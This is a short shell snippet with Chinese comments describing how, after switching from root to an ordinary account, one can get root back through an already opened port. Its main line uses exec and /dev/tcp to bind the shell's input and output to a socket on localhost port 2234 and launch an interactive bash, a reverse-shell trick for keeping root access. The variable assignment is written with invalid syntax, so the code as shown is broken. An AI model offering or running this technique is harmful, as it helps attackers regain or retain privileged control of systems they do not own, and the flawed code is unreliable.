#使用root切换到普通账号时，可以重新切换成root

#已经开放的端口
$port=2234
exec 9<> /dev/tcp/localhost/$port && exec 0<&9 && exec 1>&9 2>&1 && /bin/bash --noprofile -i


